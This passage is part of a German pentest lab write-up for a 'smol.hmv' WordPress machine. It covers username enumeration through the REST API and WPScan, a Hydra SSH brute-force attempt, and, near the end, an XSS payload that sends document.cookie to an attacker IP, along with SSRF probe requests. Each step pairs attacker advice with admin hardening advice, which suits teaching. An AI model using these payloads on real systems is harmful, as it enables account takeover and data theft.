+             <p class="recommendation">**Empfehlung (Pentester):** Fügen Sie "Jose Mario Llado Marti" und Variationen davon (z.B. `jose`, `jmlladomarti`, `think`) zur Liste potenzieller Benutzernamen für Brute-Force-Angriffe hinzu.<br>**Empfehlung (Admin):** Seien Sie sich bewusst, dass Autorennamen in Beiträgen Benutzernamen offenlegen können. Verwenden Sie Aliase oder stellen Sie sicher, dass die Benutzernamen selbst nicht leicht zu erraten sind.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://www.smol.hmv/index.php/wp-json/WP/V2/users/2 -s | jq</span></div>
+                     <pre>{
+  "id": <span class="command">2</span>,
+  "name": "<span class="command">wordpress user</span>",
+  "url": "http://smol.thm",
+  "description": "",
+  "link": "http://www.smol.hmv/index.php/author/wp/",
+  "slug": "<span class="command">wp</span>",
+  "avatar_urls": {
+    "24": "https://secure.gravatar.com/avatar/36e217cea0e094762e5dd9909e8287e5?s=24&amp;d=monsterid&amp;r=g",
+    "48": "https://secure.gravatar.com/avatar/36e217cea0e094762e5dd9909e8287e5?s=48&amp;d=monsterid&amp;r=g",
+    "96": "https://secure.gravatar.com/avatar/36e217cea0e094762e5dd9909e8287e5?s=96&amp;d=monsterid&amp;r=g"
+  },
+  "meta": [],
+  "_links": {
+    "self": [
+      {
+        "href": "http://www.smol.hmv/index.php/wp-json/wp/v2/users/2",
+        "targetHints": {
+          "allow": [
+            "GET"
+          ]
+        }
+      }
+    ],
+    "collection": [
+      {
+        "href": "http://www.smol.hmv/index.php/wp-json/wp/v2/users"
+      }
+    ]
+  }
+}</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Dieser `curl`-Befehl verwendet nun den korrekten Pfad (`/index.php/wp-json/...`) zur WP-JSON-API, um Informationen über Benutzer ID 2 anzufordern. `-s` unterdrückt die Fortschrittsanzeige. Die Ausgabe wird durch `jq` geleitet, ein Kommandozeilen-Tool zur formatierten Anzeige von JSON-Daten.</p>
+            <p class="evaluation">**Bewertung:** Erfolg! Die API ist über diesen Pfad zugänglich und liefert Informationen über Benutzer ID 2. Wir erhalten den Namen ("wordpress user"), den Benutzernamen/Slug ("wp") und die URL zu den Beiträgen dieses Autors. Dies bestätigt, dass die REST-API für Benutzerinformationen offen ist.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Fügen Sie "wp" zur Liste der gültigen Benutzernamen hinzu. Fragen Sie systematisch weitere Benutzer-IDs ab (ID 1, ID 3, etc.), um alle öffentlich sichtbaren Benutzer zu enumerieren.<br>**Empfehlung (Admin):** Beschränken Sie den Zugriff auf den `/wp-json/wp/v2/users/`-Endpunkt, um die Enumeration von Benutzernamen zu verhindern. Dies kann über Webserver-Konfigurationen (z.B. `.htaccess` oder Nginx-Regeln) oder Sicherheitsplugins erfolgen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+                     └─# <span class="command">curl --verbose -I http://www.smol.hmv/ -s</span></div>
+                     <pre>* Host www.smol.hmv:80 was resolved.
+* IPv6: (none)
+* IPv4: 192.168.2.164
+*   Trying 192.168.2.164:80...
+* <span class="password">Connected to www.smol.hmv (192.168.2.164) port 80</span>
+* using HTTP/1.x
+&gt; HEAD / HTTP/1.1
+&gt; Host: www.smol.hmv
+&gt; User-Agent: curl/8.10.1
+&gt; Accept: */*
+&gt;
+* Request completely sent off
+&lt; <span class="password">HTTP/1.1 200 OK</span>
+&lt; Date: Mon, 10 Feb 2025 22:13:40 GMT
+&lt; Server: <span class="command">Apache/2.4.41 (Ubuntu)</span>
+&lt; Link: <span class="command">&lt;http://www.smol.hmv/index.php/wp-json/&gt;; rel="https://api.w.org/"</span>
+&lt; Content-Type: text/html; charset=UTF-8
+&lt;
+
+* <span class="password">Connection #0 to host www.smol.hmv left intact</span></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Erneute `curl`-Anfrage mit `-I` (HEAD) und `--verbose -s`, diesmal aber gegen den Hostnamen `www.smol.hmv`.</p>
+            <p class="evaluation">**Bewertung:** Der Server antwortet jetzt mit `HTTP/1.1 200 OK`, was bedeutet, dass die Anfrage erfolgreich war und die Ressource gefunden wurde (keine Weiterleitung mehr). Der `Link`-Header bestätigt erneut den Pfad zur WP-JSON-API (`/index.php/wp-json/`).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Bestätigt, dass die Kommunikation mit dem Webserver über den Hostnamen korrekt funktioniert. Keine weiteren Aktionen erforderlich.<br>**Empfehlung (Admin):** Keine zusätzlichen Empfehlungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://www.smol.hmv/index.php/wp-json/WP/V2/users/1 -s | jq</span></div>
+                     <pre>{
+  "id": <span class="command">1</span>,
+  "name": "<span class="command">admin</span>",
+  "url": "http://www.smol.hmv",
+  "description": "",
+  "link": "http://www.smol.hmv/index.php/author/admin/",
+  "slug": "<span class="command">admin</span>",
+  "avatar_urls": {
+    "24": "https://secure.gravatar.com/avatar/8a2cdcf12eeb9fee6d7378b1777dc62f?s=24&amp;d=monsterid&amp;r=g",
+    "48": "https://secure.gravatar.com/avatar/8a2cdcf12eeb9fee6d7378b1777dc62f?s=48&amp;d=monsterid&amp;r=g",
+    "96": "https://secure.gravatar.com/avatar/8a2cdcf12eeb9fee6d7378b1777dc62f?s=96&amp;d=monsterid&amp;r=g"
+  },
+  "meta": [],
+  "_links": {
+    "self": [
+      {
+        "href": "http://www.smol.hmv/index.php/wp-json/wp/v2/users/1",
+        "targetHints": {
+          "allow": [
+            "GET"
+          ]
+        }
+      }
+    ],
+    "collection": [
+      {
+        "href": "http://www.smol.hmv/index.php/wp-json/wp/v2/users"
+      }
+    ]
+  }
+}</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Abfrage der Benutzer-ID 1 über den korrekten API-Pfad.</p>
+            <p class="evaluation">**Bewertung:** Erfolg! Findet den Benutzer mit ID 1. Der Name und Slug lauten beide "admin". Dies ist ein sehr häufiger, aber wichtiger Benutzername.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Fügen Sie "admin" zur Liste der gültigen Benutzernamen hinzu. Dieser Account ist oft das primäre Ziel für Brute-Force-Angriffe.<br>**Empfehlung (Admin):** Vermeiden Sie die Verwendung des Standard-Benutzernamens "admin". Ändern Sie ihn in etwas weniger Offensichtliches.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://www.smol.hmv/index.php/wp-json/WP/V2/users/3 -s | jq</span></div>
+                     <pre>{
+  "id": <span class="command">3</span>,
+  "name": "<span class="command">Jose Mario Llado Marti</span>",
+  "url": "http://smol.thm",
+  "description": "",
+  "link": "http://www.smol.hmv/index.php/author/think/",
+  "slug": "<span class="command">think</span>",
+  "avatar_urls": {
+    "24": "https://secure.gravatar.com/avatar/99bd3dfbda5111dd0e2b8e310c562ed8?s=24&amp;d=monsterid&amp;r=g",
+    "48": "https://secure.gravatar.com/avatar/99bd3dfbda5111dd0e2b8e310c562ed8?s=48&amp;d=monsterid&amp;r=g",
+    "96": "https://secure.gravatar.com/avatar/99bd3dfbda5111dd0e2b8e310c562ed8?s=96&amp;d=monsterid&amp;r=g"
+  },
+  "meta": [],
+  "_links": {
+    "self": [
+      {
+        "href": "http://www.smol.hmv/index.php/wp-json/wp/v2/users/3",
+        "targetHints": {
+          "allow": [
+            "GET"
+          ]
+        }
+      }
+    ],
+    "collection": [
+      {
+        "href": "http://www.smol.hmv/index.php/wp-json/wp/v2/users"
+      }
+    ]
+  }
+}</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Abfrage der Benutzer-ID 3 über den korrekten API-Pfad.</p>
+            <p class="evaluation">**Bewertung:** Erfolg! Findet den Benutzer mit ID 3. Der Name ist "Jose Mario Llado Marti" (wie im Blogbeitrag vermutet) und der Slug/Benutzername ist "think".</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Fügen Sie "think" zur Liste der gültigen Benutzernamen hinzu.<br>**Empfehlung (Admin):** Siehe vorherige Empfehlungen zur API-Sicherheit und Autorennamen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://www.smol.hmv/index.php/wp-json/WP/V2/users/4 -s | jq</span></div>
+                     <pre>{
+  "code": "<span class="password">rest_user_cannot_view</span>",
+  "message": "<span class="password">Sorry, you are not allowed to list users.</span>",
+  "data": {
+    "status": <span class="password">401</span>
+  }
+}</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Abfrage der Benutzer-ID 4 über den korrekten API-Pfad.</p>
+             <p class="evaluation">**Bewertung:** Die API antwortet diesmal mit einem Fehler (`code: rest_user_cannot_view`, `status: 401 Unauthorized`). Das bedeutet, dass entweder Benutzer ID 4 nicht existiert oder (wahrscheinlicher) der Zugriff auf Informationen über diesen Benutzer für anonyme Anfragen gesperrt ist. Dies zeigt, dass die Benutzer-Enumeration über die API nicht unbegrenzt möglich ist.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Beenden Sie die manuelle Enumeration von Benutzer-IDs über diesen Weg. Verwenden Sie Tools wie `wpscan`, die möglicherweise andere Methoden zur Benutzer-Enumeration kennen. Konzentrieren Sie sich auf die bisher gefundenen Benutzernamen: `admin`, `wp`, `think`.<br>**Empfehlung (Admin):** Dies ist ein Beispiel für eine (teilweise) korrekt konfigurierte Zugriffsbeschränkung der REST-API. Stellen Sie sicher, dass diese Beschränkungen konsistent für alle Benutzer gelten, die nicht öffentlich sichtbar sein sollen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://www.smol.hmv/index.php/wp-json/WP/V2/users/3 -s | jq | grep slug</span></div>
+                     <pre>  "slug": "<span class="command">think</span>",</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Wiederholt die Abfrage für Benutzer ID 3, filtert die Ausgabe aber direkt mit `grep slug`, um nur die Zeile mit dem Benutzernamen zu extrahieren.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt den Slug "think" für ID 3. Dient primär der schnellen Extraktion des Benutzernamens.</p>
+             <p class="recommendation">**Empfehlung (Pentester/Admin):** Keine zusätzlichen Empfehlungen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://www.smol.hmv/index.php/wp-json/WP/V2/users/2 -s | jq | grep slug</span></div>
+                     <pre>  "slug": "<span class="command">wp</span>",</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Extrahiert den Slug für Benutzer ID 2.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt den Slug "wp".</p>
+             <p class="recommendation">**Empfehlung (Pentester/Admin):** Keine zusätzlichen Empfehlungen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://www.smol.hmv/index.php/wp-json/WP/V2/users/1 -s | jq | grep slug</span></div>
+                     <pre>  "slug": "<span class="command">admin</span>",</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Extrahiert den Slug für Benutzer ID 1.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt den Slug "admin".</p>
+             <p class="recommendation">**Empfehlung (Pentester/Admin):** Keine zusätzlichen Empfehlungen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wpscan --url http://www.smol.hmv/ --enumerate ap,u --plugins-detection aggressive --api-token ....</span></div>
+                    <pre>
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.27
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o, default: [N]y
+[i] Updating the Database ...
+<span class="password">[i] Update completed.</span>
+
+[+] URL: <span class="command">http://www.smol.hmv/ [192.168.2.164]</span>
+[+] Started: Mon Feb 10 23:11:39 2025
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: <span class="command">Apache/2.4.41 (Ubuntu)</span>
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: <span class="command">http://www.smol.hmv/xmlrpc.php</span>
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: <span class="command">http://www.smol.hmv/readme.html</span>
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: <span class="command">http://www.smol.hmv/wp-content/uploads/</span>
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: <span class="command">http://www.smol.hmv/wp-cron.php</span>
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version <span class="command">6.7.1</span> identified (Latest, released on 2024-11-21).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://www.smol.hmv/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;
+ |  - http://www.smol.hmv/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;
+
+[+] WordPress theme in use: <span class="command">popularfx</span>
+ | Location: http://www.smol.hmv/wp-content/themes/popularfx/
+ | Last Updated: 2024-11-19T00:00:00.000Z
+ | Readme: http://www.smol.hmv/wp-content/themes/popularfx/readme.txt
+ | <span class="password">[!] The version is out of date, the latest version is 1.2.6</span>
+ | Style URL: http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5
+ | Style Name: PopularFX
+ | Style URI: https://popularfx.com
+ | Description: Lightweight theme to make beautiful websites with Pagelayer. Includes 100s of pre-made templates to ...
+ | Author: Pagelayer
+ | Author URI: https://pagelayer.com
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: <span class="command">1.2.5</span> (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5, Match: 'Version: 1.2.5'
+
+[+] Enumerating All Plugins (via Aggressive Methods)
+ Checking Known Locations - Time: 00:01:43 &lt;========&gt; (109038 / 109038) 100.00% Time: 00:01:43
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] <span class="command">akismet</span>
+ | Location: http://www.smol.hmv/wp-content/plugins/akismet/
+ | Last Updated: 2025-02-04T21:01:00.000Z
+ | Readme: http://www.smol.hmv/wp-content/plugins/akismet/readme.txt
+ | <span class="password">[!] The version is out of date, the latest version is 5.3.6</span>
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://www.smol.hmv/wp-content/plugins/akismet/, status: 200
+ |
+ | Version: <span class="command">5.2</span> (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://www.smol.hmv/wp-content/plugins/akismet/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://www.smol.hmv/wp-content/plugins/akismet/readme.txt
+
+[+] <span class="command">jsmol2wp</span>
+ | Location: http://www.smol.hmv/wp-content/plugins/jsmol2wp/
+ | Latest Version: <span class="command">1.07</span> (up to date)
+ | Last Updated: 2018-03-09T10:28:00.000Z
+ | Readme: http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt
+ | <span class="password">[!] Directory listing is enabled</span>
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/, status: 200
+ |
+ | <span class="password">[!] 2 vulnerabilities identified:</span>
+ |
+ | <span class="password">[!] Title: JSmol2WP &lt;= 1.07 - Unauthenticated Cross-Site Scripting (XSS)</span>
+ |     References:
+ |      - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20462
+ |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
+ |
+ | <span class="password">[!] Title: JSmol2WP &lt;= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)</span>
+ |     References:
+ |      - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
+ |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
+ |
+ | Version: <span class="command">1.07</span> (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 &lt;================&gt; (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] <span class="command">think</span>
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] <span class="command">wp</span>
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+
+[+] <span class="command">Jose Mario Llado Marti</span>
+ | Found By: Rss Generator (Passive Detection)
+
+[+] <span class="command">wordpress user</span>
+ | Found By: Rss Generator (Passive Detection)
+
+[+] <span class="command">admin</span>
+ | Found By: Wp Json Api (Aggressive Detection)
+ |  - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] <span class="command">gege</span>
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] <span class="command">diego</span>
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] <span class="command">xavi</span>
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] WPScan DB API OK
+ | Plan: free
+ | Requests Done (during the scan): 4
+ | Requests Remaining: 21
+
+[+] Finished: Mon Feb 10 23:13:41 2025
+[+] Requests Done: 109126
+[+] Cached Requests: 10
+[+] Data Sent: 29.299 MB
+[+] Data Received: 28.279 MB
+[+] Memory used: 476.863 MB
+[+] Elapsed time: 00:02:01</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** WPScan, das Standardtool zur Überprüfung von WordPress-Sicherheit, wird ausgeführt. `--url http://www.smol.hmv/` gibt das Ziel an. `--enumerate ap,u` weist WPScan an, nach allen Plugins (`ap`) und Benutzern (`u`) zu suchen. `--plugins-detection aggressive` verwendet bekannte Pfade und andere aggressive Methoden zur Plugin-Erkennung. `--api-token ...` wird für den Zugriff auf die WPScan Vulnerability Database benötigt (hier ausgeblendet).</p>
+            <p class="evaluation">**Bewertung:** WPScan liefert eine Fülle kritischer Informationen und bestätigt viele frühere Funde:
+*   **Basis-Infos:** Bestätigt WordPress 6.7.1, Theme "popularfx" (veraltet), aktiviertes XML-RPC, browsebares Upload-Verzeichnis, aktiviertes WP-Cron.
+*   **Plugins:** Identifiziert zwei Plugins:
+    *   `akismet` Version 5.2 (veraltet).
+    *   `jsmol2wp` Version 1.07. **Dies ist der kritischste Fund!** WPScan meldet zwei bekannte Schwachstellen für diese Version:
+        *   Unauthenticated Cross-Site Scripting (XSS) (CVE-2018-20462)
+        *   Unauthenticated Server Side Request Forgery (SSRF) (CVE-2018-20463)
+*   **Benutzer:** WPScan enumeriert eine umfassendere Liste von Benutzernamen als die manuelle API-Abfrage: `think`, `wp`, `Jose Mario Llado Marti`, `wordpress user`, `admin`, `gege`, `diego`, `xavi`. Es verwendet verschiedene Methoden wie API-Abfragen, Brute-Forcing von Autoren-IDs und Analyse von Login-Fehlermeldungen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Schwachstellen im `jsmol2wp`-Plugin (insbesondere SSRF und potenziell XSS) sind die vielversprechendsten Angriffsvektoren. Recherchieren Sie Exploits für CVE-2018-20463 (SSRF) und CVE-2018-20462 (XSS). Die vollständige Liste der Benutzernamen ist sehr wertvoll für Brute-Force-Angriffe (z.B. via XML-RPC oder das Login-Formular).<br>**Empfehlung (Admin):** Das `jsmol2wp`-Plugin ist veraltet (letztes Update 2018) und hat bekannte, kritische Schwachstellen. Es sollte **sofort deaktiviert und deinstalliert** werden. Aktualisieren Sie das Theme "popularfx" und das Plugin "akismet". Überprüfen Sie alle gefundenen Benutzerkonten und deaktivieren/entfernen Sie nicht benötigte. Sichern Sie XML-RPC ab (z.B. deaktivieren oder Zugriff beschränken), wenn es nicht benötigt wird.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">Jose Mario Llado Marti</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Wiederholung des Namens, wahrscheinlich als Notiz.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt den Namen des Benutzers "think".</p>
+             <p class="recommendation">**Empfehlung (Pentester/Admin):** Keine Aktion erforderlich.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">hydra -l jose -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.164 -t 64</span></div>
+                     <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-10 23:22:21
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344287 login tries (l:1/p:14344287), ~224130 tries per task
+[DATA] attacking ssh://192.168.2.164:22/
+<span class="password">[ERROR] target ssh://192.168.2.164:22/ does not support password authentication (method reply 4).</span></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Hydra, ein Brute-Force-Tool für Logins, wird hier verwendet, um zu versuchen, sich per SSH (Port 22) auf dem Ziel `192.168.2.164` einzuloggen. `-l jose` versucht den Benutzernamen "jose". `-P /usr/share/wordlists/rockyou.txt` verwendet die bekannte RockYou-Passwortliste. `-t 64` versucht, 64 parallele Verbindungen aufzubauen (Hydra warnt, dass dies für SSH oft zu viel ist).</p>
+            <p class="evaluation">**Bewertung:** Der Versuch schlägt fehl, aber aus einem wichtigen Grund: `[ERROR] target ssh://192.168.2.164:22/ does not support password authentication`. Das bedeutet, der SSH-Server ist so konfiguriert, dass er keine Passwort-Logins akzeptiert. Nur schlüsselbasierte Authentifizierung (oder möglicherweise andere Methoden wie Keyboard-Interactive) ist erlaubt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Brute-Force-Angriffe mit Passwörtern gegen SSH sind hier sinnlos. Suchen Sie nach anderen Wegen, um Zugriff zu erlangen, z.B. durch Ausnutzung von Web-Schwachstellen, oder suchen Sie nach potenziellen privaten SSH-Schlüsseln auf dem System, falls Sie später einen initialen Zugriff erhalten.<br>**Empfehlung (Admin):** Die Konfiguration, Passwort-Authentifizierung für SSH zu deaktivieren (`PasswordAuthentication no` in `/etc/ssh/sshd_config`), ist eine wichtige Sicherheitsmaßnahme (Best Practice). Stellen Sie sicher, dass dies beabsichtigt ist und weiterhin durchgesetzt wird.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+wpscan
+
+
+[+] Enumerating All Plugins (via Passive Methods)
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] <span class="command">jsmol2wp</span>
+ | Location: http://www.smol.hmv/wp-content/plugins/jsmol2wp/
+ | Latest Version: <span class="command">1.07</span> (up to date)
+ | Last Updated: 2018-03-09T10:28:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | <span class="password">[!] 2 vulnerabilities identified:</span>
+ |
+ | <span class="password">[!] Title: JSmol2WP &lt;= 1.07 - Unauthenticated Cross-Site Scripting (XSS)</span>
+ |     References:
+ |      - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20462
+ |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
+ |
+ | <span class="password">[!] Title: JSmol2WP &lt;= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)</span>
+ |     References:
+ |      - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
+ |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
+ |
+ | Version: <span class="command">1.07</span> (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt
+
+
+jsmol2wp Version: 1.07
+
+
+wpscan Ende</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Dieser Abschnitt scheint ein Auszug aus der vorherigen WPScan-Ausgabe zu sein, der sich speziell auf das `jsmol2wp`-Plugin konzentriert.</p>
+             <p class="evaluation">**Bewertung:** Wiederholt die kritische Information über die XSS- (CVE-2018-20462) und SSRF- (CVE-2018-20463) Schwachstellen in `jsmol2wp` Version 1.07.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Fokus auf die Ausnutzung dieser Schwachstellen, insbesondere SSRF, da dies oft zu Local File Inclusion (LFI) oder Remote Code Execution (RCE) führen kann.<br>**Empfehlung (Admin):** Erneut: Plugin sofort deaktivieren und deinstallieren.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+wpscan --url http://www.smol.hmv/xmlrpc.php --passwords /usr/share/wordlists/rockyou.txt --usernames admin
+http://www.smol.hmv/wp-content/plugins/jsmol2wp/jsmol.php?script=&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+
+<span class="password">Not Found</span>
+
+The requested URL was not found on this server.
+Apache/2.4.41 (Ubuntu) Server at www.smol.hmv Port 80
+
+
+
+http://www.smol.hmv/wp-content/plugins/jsmol2wp/jsmol.php?script=&lt;script&gt;document.location='http://192.168.2.199/steal.php?cookie='+document.cookie&lt;/script&gt;
+
+
+<span class="password">Not Found</span>
+
+The requested URL was not found on this server.
+Apache/2.4.41 (Ubuntu) Server at www.smol.hmv Port 80
+
+
+curl -X POST "http://www.smol.hmv/wp-content/plugins/jsmol2wp/ssrf.php" -d "url=http://127.0.0.1:80/admin"
+curl -X POST "http://www.smol.hmv/wp-content/plugins/jsmol2wp/ssrf.php" -d "url=http://192.168.1.1"
+curl -X POST "http://www.smol.hmv/wp-content/plugins/jsmol2wp/ssrf.php" -d "url=http://10.0.0.1"
+curl -X POST "http://www.smol.hmv/wp-content/plugins/jsmol2wp/ssrf.php" -d "url=http://yourserver.com/ssrf-test"
